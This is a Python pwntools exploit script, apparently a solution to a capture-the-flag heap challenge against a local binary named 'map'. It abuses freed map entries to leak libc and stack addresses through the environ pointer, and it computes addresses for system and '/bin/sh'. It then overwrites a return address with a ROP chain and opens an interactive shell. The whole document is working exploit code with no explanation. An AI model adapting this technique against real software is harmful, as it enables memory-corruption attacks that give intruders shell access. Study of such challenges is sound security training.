from pwn import *

def addMap(x, y, ob, name, size, des):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil("X = ")
    r.sendline(str(x))
    r.recvuntil("Y = ")
    r.sendline(str(y))
    r.recvuntil("Objects = ")
    r.sendline(str(ob))
    r.recvuntil("Name : ")
    r.sendline(name)
    r.recvuntil("Map Description Size:")
    r.sendline(str(size))
    r.sendline(des)

def selectMap(index):
    r.recvuntil('>')
    r.sendline('0')
    r.recvuntil("ID : ")
    r.sendline(str(index))

def editMap(x, y, ob, name, size, des):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil("X = ")
    r.sendline(str(x))
    r.recvuntil("Y = ")
    r.sendline(str(y))
    r.recvuntil("Objects = ")
    r.sendline(str(ob))
    r.recvuntil("Name : ")
    r.sendline(name)
    r.recvuntil("Map Description Size:")
    r.sendline(str(size))
    r.sendline(des)

def deleteMap(index):
    r.recvuntil('>')
    r.sendline('4')
    r.recvuntil("Which ID do you want to delete ?")
    r.sendline(str(index))

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
r = process('./map')
# gdb.attach(r, )
addMap(10, 10, 10, "lol", 100, "lol")
addMap(10, 10, 10, "lol", 100, "lol")
addMap(10, 10, 10, "lol", 400, "lol")
addMap(10, 10, 10, "lol", 400, "lol")
selectMap(2)
deleteMap(2)
deleteMap(3)
r.recvuntil('>')
r.sendline('3')
r.recvuntil('Do you want to view selected map ?(y,n)')
r.sendline('y')
txt = r.recvline_startswith('Description: ').strip()[13:]+'\x00'*5
leak = u64(txt[:8])
base = leak - 0x3c4b78
environ = base + libc.symbols['environ']
system = base + libc.symbols['system']
sh = base + next(libc.search('/bin/sh\x00'))
log.info("leak: %s" %hex(leak))
log.info("base: %s" %hex(base))
log.info("inviron: %s" %hex(environ))
log.info("system: %s" %hex(system))
log.info("sh: %s" %hex(sh))
deleteMap(1)
deleteMap(0)
addMap(10, 10, 10, "lol", 400, "lol")#0
addMap(10, 10, 10, "lol", 400, "lol")#1
selectMap(0)
editMap(10, 10, 10, "0", 400, "a"*0xc0+p32(100)*4+p64(environ)*2)
selectMap(1)
r.recvuntil('>')
r.sendline('3')
r.recvuntil('Do you want to view selected map ?(y,n)')
r.sendline('y')
txt = r.recvline_startswith('Description: ').strip()[13:]+'\x00'*5
leak = u64(txt[:8])
log.info(hex(leak))
rbp = ((leak-0x10)&0xFFFFFFFFFFFFFFF0) - 0xe0
log.info("rbp: %s"%hex(rbp))
selectMap(0)
editMap(10, 10, 10, "0", 400, "a"*0xc0+p32(100)*4+p64(rbp)*2)
selectMap(1)
r.recvuntil('>')
r.sendline('3')
r.recvuntil('Do you want to view selected map ?(y,n)')
r.sendline('y')
txt = r.recvline_startswith('Description: ').strip()[13:]+'\x00'*5
leak = u64(txt[:8])
log.info(hex(leak))
basefile = leak - 0x1530
log.info("Base of File: %s" %hex(basefile))
poprdi = basefile + 0x1593
leak = rbp - 0x18
selectMap(0)
editMap(10, 10, 10, "0", 400, "a"*0xc0 +p32(400)*4+p64(leak)*2)
selectMap(1)
editMap(10, 10, 10, "\x00", 100, p64(poprdi)+p64(sh)+p64(system))
r.interactive()
